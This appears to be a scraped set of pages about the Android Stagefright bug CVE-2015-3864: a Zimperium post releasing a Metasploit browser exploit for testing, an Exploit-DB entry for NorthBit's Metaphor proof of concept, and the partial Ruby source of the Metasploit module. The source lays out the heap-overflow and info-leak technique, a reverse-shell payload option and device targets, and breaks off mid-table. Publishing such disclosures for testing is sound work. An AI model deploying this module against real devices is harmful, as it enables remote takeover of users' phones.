Last year, we disclosed a series of critical vulnerabilities within Android’s multimedia processing code — libstagefright. We promised to release the exploit for testing purposes and quickly published our [exploit for CVE-2015-1538](/the-latest-on-stagefright-cve-2015-1538-exploit-is-now-available-for-testing-purposes/) targeting the Galaxy Nexus running Android 4.0.4. We delivered this exploit via MMS to help carriers simulate and block a potential MMS-based worm scenario. We are now ready to release our browser-based CVE-2015-3864 exploit for testing, but first let’s look at what prompted this decision.

### The Impact on Android

Google responded quickly when we first notified them of the vulnerabilities we discovered. They:

1. quickly accepted patches provided to AOSP
2. updated the Hangouts and Messenger apps to remove automatic media processing
3. started releasing monthly Nexus updates and bulletins and
4. pushed OEMs and carriers to improve the way they handle and remediate vulnerabilities

Despite improvements in the ecosystem (kudos where deserved), updating Android devices remains a challenge and leaves many end users’ handsets exposed to serious vulnerabilities. Multimedia-related vulnerabilities have made an appearance in every Nexus/Android Security Bulletin to date. The most recent Android Security Bulletin in September included 11 vulnerabilities that affected Mediaserver amongst the 55 CVEs referenced. Prior to that, 460 CVEs affecting the Android platform (159 critical, 191 high, 68 moderate, and 5 with low severity) had been disclosed. Usually, an attacker needs between one and five vulnerabilities to take full control over a device. Keeping devices updated has never been more important.

Google’s Android Security Team has invested heavily in responding to media-related security problems by hardening Mediaserver (and the OS too) significantly in Android Nougat. Unfortunately, the adoption rate of new versions of Android is very slow. Nearly one year after its initial release, Android Marshmallow (6.0) is only running on 18.7% of devices in the ecosystem. If this trend continues, Android Nougat will only be used on roughly the same number of devices this time next year. Any device not updated will not benefit from a majority of the improvements Google has made in response to our (and others’) research related to multimedia processing. We implore those responsible for releasing updates to do whatever possible to rectify this situation.

The latest effort, undertaken by our [Joshua J. Drake](https://www.twitter.com/jduck), culminated in a Metasploit-module that exploits CVE-2015-3864 via the Web browser. This module is able to exploit a vulnerable device using only three quick HTTP requests and supports 29 different device/firmware versions simultaneously — a significant improvement over the [Metaphor exploit](https://github.com/NorthBit/Metaphor/tree/master/metaphor). We collaborated with Rapid7 to integrate with the very recent “mettle” payload developed by the Metasploit team. This payload executes purely in memory, which allows operating within the SELinux policy that restricts mediaserver on Android 5.x to yield a meterpreter session.

[![screen1](https://www.zimperium.com/wp-content/uploads/2016/09/screen1.png)](https://asciinema.org/a/8jlbdq006wsnkqewvcaf05wva)

The following builds are supported by the module at this time:

1. Nexus 7 (Wi-Fi) (razor) with Android 5.0 (LRX21P)
2. Nexus 7 (Wi-Fi) (razor) with Android 5.0.1 (LRX22C)
3. Nexus 7 (Wi-Fi) (razor) with Android 5.0.2 (LRX22G)
4. Nexus 7 (Wi-Fi) (razor) with Android 5.1 (LMY47O)
5. Nexus 7 (Wi-Fi) (razor) with Android 5.1.1 (LMY47V)
6. Nexus 7 (Wi-Fi) (razor) with Android 5.1.1 (LMY48G)
7. Nexus 7 (Wi-Fi) (razor) with Android 5.1.1 (LMY48I)
8. Nexus 7 (Mobile) (razorg) with Android 5.0.2 (LRX22G)
9. Nexus 7 (Mobile) (razorg) with Android 5.1 (LMY47O)
10. Nexus 7 (Mobile) (razorg) with Android 5.1.1 (LMY47V)
11. Nexus 5 (hammerhead) with Android 5.0 (LRX21O)
12. Nexus 5 (hammerhead) with Android 5.0.1 (LRX22C)
13. Nexus 5 (hammerhead) with Android 5.1 (LMY47D)
14. Nexus 5 (hammerhead) with Android 5.1 (LMY47I)
15. Nexus 5 (hammerhead) with Android 5.1.1 (LMY48B)
16. Nexus 5 (hammerhead) with Android 5.1.1 (LMY48I)
17. Nexus 6 (shamu) with Android 5.0 (LRX21O)
18. Nexus 6 (shamu) with Android 5.0.1 (LRX22C)
19. Nexus 6 (shamu) with Android 5.1 (LMY47D)
20. Nexus 6 (shamu) with Android 5.1 (LMY47E)
21. Nexus 6 (shamu) with Android 5.1 (LMY47I)
22. Nexus 6 (shamu) with Android 5.1.1 (LYZ28E)
23. Nexus 6 (shamu) with Android 5.1 (LMY47M)
24. Nexus 6 (shamu) with Android 5.1.1 (LMY47Z)
25. Nexus 6 (shamu) with Android 5.1.1 (LVY48C)
26. Nexus 6 (shamu) with Android 5.1.1 (LMY48I)
27. Nexus 6 (shamu) with Android 5.1.1 (LYZ28J)
28. Nexus 6 (shamu) with Android 5.1.1 (LVY48E)
29. Samsung Galaxy S5 (VZW SM-G900V) with Android 5.0 (LRX21T)

### New Developments

On September 7th, the day after the September Android Security Bulletin was published, Google Project Zero researcher, Mark Brand, released an [analysis](https://googleprojectzero.blogspot.com/2016/09/return-to-libstagefright-exploiting.html) of and exploit for CVE 2016-3861. When we looked at Brand’s exploit, we noticed he used a nearly identical technique to what Josh used in this module. Interestingly enough, Brand found the same bug reported by Josh on August 15th, 2015. Josh’s proposed patch for this vulnerability is [here](https://gist.github.com/jduck/6c217beed59d23381385e770c4e1f37f). The [bug](https://code.google.com/p/android/issues/detail?id=182910) report was accidentally marked as obsolete. We believe that if two independent researchers found the exact same bug, and developed the exact same techniques, the likelihood of those techniques being used for targeted attacks is high. As a result, we sped up the release of our exploit to the general public so that security teams, administrators, and penetration testers alike may test whether or not their systems remain vulnerable. We welcome the security community to build further on this work and help to maintain this module.

During our research, we identified ways that Google can make this attack less successful. We’ve already communicated these methods to Google and are happy to work with other vendors and carriers through [ZHA](/zha-zimperiums-initiative-to-fill-the-gaps-in-android-security/) to discuss these methods as well.

To download the CVE-2015-3864 exploit, simply update your Metasploit. If you don’t already have Metasploit, you can obtain it by following the instructions from the [Metasploit developer docs](https://github.com/rapid7/metasploit-framework/wiki/Setting-Up-a-Metasploit-Development-Environment).

### Disclosure timeline:

* May 4th 2015: Joshua reported CVE-2015-3824 to Google’s Android Security team
* August 13th 2015: Google releases a fix for CVE-2015-3824
* August 13th 2015: Exodus discloses CVE-2015-3864 (duplicate of a Project Zero report)
* August 15th 2015: Joshua reported what eventually became CVE-2016-3861
* September 9th 2015: Google releases a fix for CVE-2015-3864
* March 24th 2016: Metaphor exploit released (showing ASLR bypass)
* May 2nd 2016: Josh’s report of CVE-2016-3861 was accidentally marked as obsolete
* June 6th, 2016: Josh shared our CVE-2015-3864 Metasploit module with the Google/Android Security Team
* August 12th 2016: Shared exploit with vendors and carriers through ZHA partners
* July 29th 2016: Shared details on the exploit with the GSMA Device Security Group
* August 9th 2016: Shared details on the exploit at WOOT in the Day 2 Keynote
* September 6th 2016: Google releases September bulletin
* September 7th 2016: Google Project Zero released Mark Brand’s exploit for CVE-2016-3861 using nearly identical techniques
* September 9th 2016: Android Security Team offered a $3,000 reward for CVE-2016-3861
* September 13th 2016: Android Security Team donates $6,000 to EB Research on Josh’s behalf (matching the $3,000 reward)
* September 23rd 2016: Public release

### Zimperium customers:

Zimperium’s z9 engine detects this attack, Mark Brand’s CVE-2016-3861 exploit, and much more without requiring any update. For more information about our award winning technology, [read about our products](https://www.zimperium.com/products).

 ![Avatar photo](https://secure.gravatar.com/avatar/ad516503a11cd5ca435acc9bb6523536?s=90)
##### Author: [zLabs](https://www.zimperium.com/author/zlabs/ "zLabs")

## Post navigation

[Previous Blog](https://www.zimperium.com/blog/zimperium-partners-with-blackberry-to-provide-mobile-threat-detection/)[Next Blog](https://www.zimperium.com/blog/mobile-security-is-national-security/)

##### Recommended Reading

[![](data:image/svg+xml...)![](https://www.zimperium.com/wp-content/uploads/2022/10/stagefrightExploit2-400x250.png)
##### Reflecting on Stagefright Patches](https://www.zimperium.com/blog/reflecting-on-stagefright-patches/ "Reflecting on Stagefright Patches")

[![Reflecting on Recent iOS and Android Security Updates](data:image/svg+xml...)![Reflecting on Recent iOS and Android Security Updates](https://zimpstage.wpengine.com/wp-content/uploads/2022/11/default.jpg)

##### Reflecting on Recent iOS and Android Security Updates](https://www.zimperium.com/blog/reflecting-on-recent-ios-and-android-security-updates/ "Reflecting on Recent iOS and Android Security Updates")

[![](data:image/svg+xml...)![](https://www.zimperium.com/wp-content/uploads/2022/10/stagefrightExploit2-400x250.png)
##### The Latest on Stagefright: CVE-2015-1538 Exploit is Now Available for Testing Purposes](https://www.zimperium.com/blog/the-latest-on-stagefright-cve-2015-1538-exploit-is-now-available-for-testing-purposes/ "The Latest on Stagefright: CVE-2015-1538 Exploit is Now Available for Testing Purposes")

 ![](data:image/svg+xml...)![](https://www.zimperium.com/wp-content/uploads/2024/08/ZIMPERIUM-logo_orangeZ_white-300x46.png)

4055 Valley View Suite 300

Dallas, TX 75244

**US Toll Free:**  844-601-6760

**International:**  +1.415.992.8922

**General:** info@zimperium.com

**Press:** pr@zimperium.com

**[Compliance Hotline](https://my.compliancehotline.com/report/zimperium)**

**[Modern Slavery Act Statement](https://www.zimperium.com/modern-slavery-act-statement/)**

##### Learn More

* [FAQ](https://www.zimperium.com/faq/)
* [Support](https://www.zimperium.com/support/)
* [Blog](https://www.zimperium.com/blog/)
* [Threat Research](https://www.zimperium.com/zlabs/)
* [Glossary](https://www.zimperium.com/glossary/)
* [Responsible Disclosure Policy](https://lp.zimperium.com/hubfs/Zimperium/Zimperium%20Vulnerability%20Disclosure%20Policy%20%281%29.pdf)

##### Our Focus

* [Mobile Threat Defense](https://www.zimperium.com/mobile-threat-defense/)
* [Mobile Application Security](https://www.zimperium.com/mobile-app-security/)
* [Enterprise Mobile Security](https://www.zimperium.com/enterprise-mobile-security/)
* [Mobile Phishing Protection](https://www.zimperium.com/mobile-phishing-protection/)
* [Mobile EDR](https://www.zimperium.com/mobile-edr/)

Copyright © 2010-2024 Zimperium.  All Rights Reserved.[Privacy Policy](https://www.zimperium.com/privacy-policy/)  | Privacy Settings



=== Content from www.exploit-db.com_7c8521e1_20250124_224810.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Google Android 5.0.1 - Metaphor Stagefright (ASLR Bypass)

#### EDB-ID:

###### 39640

#### CVE:

###### [2015-3864](https://nvd.nist.gov/vuln/detail/CVE-2015-3864)

---

**EDB Verified:**

#### Author:

###### [NorthBit](/?author=8548)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [Android](/?platform=android)

#### Date:

###### 2016-03-30

---

**Vulnerable App:**

```
Source: https://github.com/NorthBit/Metaphor

Metaphor - Stagefright with ASLR bypass By Hanan Be'er from NorthBit Ltd.

Link to whitepaper: https://raw.githubusercontent.com/NorthBit/Public/master/NorthBit-Metaphor.pdf

Twitter: https://twitter.com/High_Byte

Metaphor's source code is now released! The source include a PoC that generates MP4 exploits in real-time and bypassing ASLR. The PoC includes lookup tables for Nexus 5 Build LRX22C with Android 5.0.1. Server-side of the PoC include simple PHP scripts that run the exploit generator - I'm using XAMPP to serve gzipped MP4 files. The attack page is index.php.

The exploit generator is written in Python and used by the PHP code.

usage: metaphor.py [-h] [-c CONFIG] -o OUTPUT {leak,rce,suicide} ...

positional arguments:
  {leak,rce,suicide}    Type of exploit to generate

optional arguments:
  -h, --help            show this help message and exit
  -c CONFIG, --config CONFIG
                        Override exploit configuration
  -o OUTPUT, --output OUTPUT
Credits: To the NorthBit team E.P. - My shining paladin, for assisting in boosting this project to achieve all the goals.

Proof of Concept:
https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39640.zip

```

**Tags:**

**Advisory/Source:**
[Link](https://github.com/NorthBit/Metaphor)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from www.exploit-db.com_8f209304_20250124_224812.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Google Android 5.0 < 5.1.1 - 'Stagefright' .MP4 tx3g Integer Overflow (Metasploit)

#### EDB-ID:

###### 40436

#### CVE:

###### [2015-3864](https://nvd.nist.gov/vuln/detail/CVE-2015-3864)

---

**EDB Verified:**

#### Author:

###### [Metasploit](/?author=3211)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [Android](/?platform=android)

#### Date:

###### 2016-09-27

---

**Vulnerable App:**

```
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::RopDb

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Android Stagefright MP4 tx3g Integer Overflow",
      'Description'    => %q{
          This module exploits a integer overflow vulnerability in the Stagefright
        Library (libstagefright.so). The vulnerability occurs when parsing specially
        crafted MP4 files. While a wide variety of remote attack vectors exist, this
        particular exploit is designed to work within an HTML5 compliant browser.

          Exploitation is done by supplying a specially crafted MP4 file with two
        tx3g atoms that, when their sizes are summed, cause an integer overflow when
        processing the second atom. As a result, a temporary buffer is allocated
        with insufficient size and a memcpy call leads to a heap overflow.

          This version of the exploit uses a two-stage information leak based on
        corrupting the MetaData that the browser reads from mediaserver. This method
        is based on a technique published in NorthBit's Metaphor paper. First,
        we use a variant of their technique to read the address of a heap buffer
        located adjacent to a SampleIterator object as the video HTML element's
        videoHeight. Next, we read the vtable pointer from an empty Vector within
        the SampleIterator object using the video element's duration. This gives
        us a code address that we can use to determine the base address of
        libstagefright and construct a ROP chain dynamically.

        NOTE: the mediaserver process on many Android devices (Nexus, for example) is
        constrained by SELinux and thus cannot use the execve system call. To avoid
        this problem, the original exploit uses a kernel exploit payload that disables
        SELinux and spawns a shell as root. Work is underway to make the framework
        more amenable to these types of situations. Until that work is complete, this
        exploit will only yield a shell on devices without SELinux or with SELinux in
        permissive mode.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          # Exodus/jordan # initial discovery / disclosure
          'jduck',     # Metasploit module, further infoleak development
          'NorthBit'   # intiial information leak implementation
        ],
      'References'     =>
        [
          [ 'CVE', '2015-3864' ],
          [ 'URL', 'https://blog.exodusintel.com/2015/08/13/stagefright-mission-accomplished/' ],
          [ 'URL', 'http://googleprojectzero.blogspot.com/2015/09/stagefrightened.html' ],
          [ 'URL', 'https://raw.githubusercontent.com/NorthBit/Public/master/NorthBit-Metaphor.pdf' ],
          [ 'URL', 'https://github.com/NorthBit/Metaphor' ],
          # Not used, but related
          [ 'URL', 'http://drops.wooyun.org/papers/7558' ],
          [ 'URL', 'http://translate.wooyun.io/2015/08/08/Stagefright-Vulnerability-Disclosure.html' ],
          [ 'URL', 'https://www.nccgroup.trust/globalassets/our-research/uk/whitepapers/2016/01/libstagefright-exploit-notespdf/' ],
        ],
      'Payload'        =>
        {
          'Space'    => 2048,
          'DisableNops' => true,
        },
      #'DefaultOptions' => { 'PAYLOAD' => 'linux/armle/mettle/reverse_tcp' },
      'Platform'       => 'linux',
      'Arch'           => [ARCH_ARMLE], # TODO: , ARCH_X86, ARCH_X86_64, ARCH_MIPSLE],
      'Targets'        =>
        [
          [ 'Automatic', {} ],
          #
          # Each target includes information about the device, firmware, and
          # how exactly to about exploiting it.
          #
          # Primarily, these targets are used to map a browser's User-Agent to
          # exploit specifics for that device / build.
          #
          [
            'Nexus 7 (Wi-Fi) (razor) with Android 5.0 (LRX21P)',
            {
              'Model' => 'Nexus 7',
              'Build' => 'LRX21P',
              'Release' => '5.0',
              'Rop' => 'lrx',
              'SprayAddress' => 0xb1508000
            }
          ],
          [
            'Nexus 7 (Wi-Fi) (razor) with Android 5.0.1 (LRX22C)',
            {
              'Model' => 'Nexus 7',
              'Build' => 'LRX22C',
              'Release' => '5.0.1',
              'Rop' => 'lrx'
            }
          ],
          [
            'Nexus 7 (Wi-Fi) (razor) with Android 5.0.2 (LRX22G)',
            {
              'Model' => 'Nexus 7',
              'Build' => 'LRX22G',
              'Release' => '5.0.2',
              'Rop' => 'lrx'
            }
          ],
          [
            'Nexus 7 (Wi-Fi) (razor) with Android 5.1 (LMY47O)',
            {
              'Model' => 'Nexus 7',
              'Build' => 'LMY47O',
              'Release' => '5.1',
              'Rop' => 'lmy-1'
            }
          ],
          [
            'Nexus 7 (Wi-Fi) (razor) with Android 5.1.1 (LMY47V)',
            {
              'Model' => 'Nexus 7',
              'Build' => 'LMY47V',
              'Release' => '5.1.1',
              'Rop' => 'lmy-1'
            }
          ],
          [
            'Nexus 7 (Wi-Fi) (razor) with Android 5.1.1 (LMY48G)',
            {
              'Model' => 'Nexus 7',
              'Build' => 'LMY48G',
              'Release' => '5.1.1',
              'Rop' => 'lmy-1'
            }
          ],
          [
            'Nexus 7 (Wi-Fi) (razor) with Android 5.1.1 (LMY48I)',
            {
              'Model' => 'Nexus 7',
              'Build' => 'LMY48I',
              'Release' => '5.1.1',
              'Rop' => 'lmy-2'
            }
          ],
          [
            'Nexus 7 (Mobile) (razorg) with Android 5.0.2 (LRX22G)',
            {
              'Model' => 'Nexus 7',
              'Build' => 'LRX22G',
              'Release' => '5.0.2',
              'Rop' => 'lrx'
            }
          ],
          [
            'Nexus 7 (Mobile) (razorg) with Android 5.1 (LMY47O)',
            {
              'Model' => 'Nexus 7',
              'Build' => 'LMY47O',
              'Release' => '5.1',
              'Rop' => 'lmy-1'
            }
          ],
          [
            'Nexus 7 (Mobile) (razorg) with Android 5.1.1 (LMY47V)',
            {
              'Model' => 'Nexus 7',
              'Build' => 'LMY47V',
              'Release' => '5.1.1',
              'Rop' => 'lmy-1'
            }
          ],
          [
            'Nexus 5 (hammerhead) with Android 5.0 (LRX21O)',
            {
              'Model' => 'Nexus 5',
              'Build' => 'LRX21O',
              'Release' => '5.0',
              'Rop' => 'lrx'
            }
          ],
          [
            'Nexus 5 (hammerhead) with Android 5.0.1 (LRX22C)',
            {
              'Model' => 'Nexus 5',
              'Build' => 'LRX22C',
              'Release' => '5.0.1',
              'Rop' => 'lrx'
            }
          ],
          [
            'Nexus 5 (hammerhead) with Android 5.1 (LMY47D)',
            {
              'Model' => 'Nexus 5',
              'Build' => 'LMY47D',
              'Release' => '5.1',
              'Rop' => 'lmy-1'
            }
          ],
          [
            'Nexus 5 (hammerhead) with Android 5.1 (LMY47I)',
            {
              'Model' => 'Nexus 5',
              'Build' => 'LMY47I',
              'Release' => '5.1',
              'Rop' => 'lmy-1'
            }
          ],
          [
            'Nexus 5 (hammerhead) with Android 5.1.1 (LMY48B)',
            {
              'Model' => 'Nexus 5',
              'Build' => 'LMY48B',
              'Release' => '5.1.1',
              'Rop' => 'lmy-1'
            }
          ],
          [
            'Nexus 5 (hammerhead) with Android 5.1.1 (LMY48I)',
            {
              'Model' => 'Nexus 5',
              'Build' => 'LMY48I',
              'Release' => '5.1.1',
              'Rop' => 'lmy-2'
            }
          ],
          [
            'Nexus 6 (shamu) with Android 5.0 (LRX21O)',
            {
              'Model' => 'Nexus 6',
              'Build' => 'LRX21O',
              'Release' => '5.0',
              'Rop' => 'lrx'
            }
          ],
          [
            'Nexus 6 (shamu) with Android 5.0.1 (LRX22C)',
            {
              'Model' => 'Nexus 6',
              'Build' => 'LRX22C',
              'Release' => '5.0.1',
              'Rop' => 'lrx'
            }
          ],
          [
            'Nexus 6 (shamu) with Android 5.1 (LMY47D)',
            {
              'Model' => 'Nexus 6',
              'Build' => 'LMY47D',
              'Release' => '5.1',
              'Rop' => 'lmy-1'
            }
          ],
          [
            'Nexus 6 (shamu) with Android 5.1 (LMY47E)',
            {
              'Model' => 'Nexus 6',
              'Build' => 'LMY47E',
              'Release' => '5.1',
              'Rop' => 'lmy-1'
            }
          ],
          [
            'Nexus 6 (shamu) with Android 5.1 (LMY47I)',
            {
              'Model' => 'Nexus 6',
              'Build' => 'LMY47I',
              'Release' => '5.1',
              'Rop' => 'lmy-1'
            }
          ],
          [
            'Nexus 6 (shamu) with Android 5.1.1 (LYZ28E)',
            {
              'Model' => 'Nexus 6',
              'Build' => 'LYZ28E',
              'Release' => '5.1.1',
              'Rop' => 'shamu / LYZ28E'
            }
          ],
          [
            'Nexus 6 (shamu) with Android 5.1 (LMY47M)',
            {
              'Model' => 'Nexus 6',
              'Build' => 'LMY47M',
              'Release' => '5.1',
              'Rop' => 'lmy-1'
            }
          ],
          [
            'Nexus 6 (shamu) with Android 5.1.1 (LMY47Z)',
            {
              'Model' => 'Nexus 6',
              'Build' => 'LMY47Z',
              'Release' => '5.1.1',
              'Rop' => 'lmy-1'
            }
          ],
          [
            'Nexus 6 (shamu) with Android 5.1.1 (LVY48C)',
            {
              'Model' => 'Nexus 6',
              'Build' => 'LVY48C',
              'Release' => '5.1.1',
              'Rop' => 'lmy-1'
            }
          ],
          [
            'Nexus 6 (shamu) with Android 5.1.1 (LMY48I)',
            {
              'Model' => 'Nexus 6',
              'Build' => 'LMY48I',
              'Release' => '5.1.1',
              'Rop' => 'lmy-2'
            }
          ],
          [
            'Nexus 6 (shamu) with Android 5.1.1 (LYZ28J)',
            {
              'Model' => 'Nexus 6',
              'Build' => 'LYZ28J',
              'Release' => '5.1.1',
              'Rop' => 'shamu / LYZ28J'
            }
          ],
          [
            'Nexus 6 (shamu) with Android 5.1.1 (LVY48E)',
            {
              'Model' => 'Nexus 6',
              'Build' => 'LVY48E',
              'Release' => '5.1.1',
              'Rop' => 'lmy-2'
            }
          ],
          [
            'Samsung Galaxy S5 (VZW SM-G900V) with Android 5.0 (LRX21T)',
            {
              'Model' => 'SM-G900V',
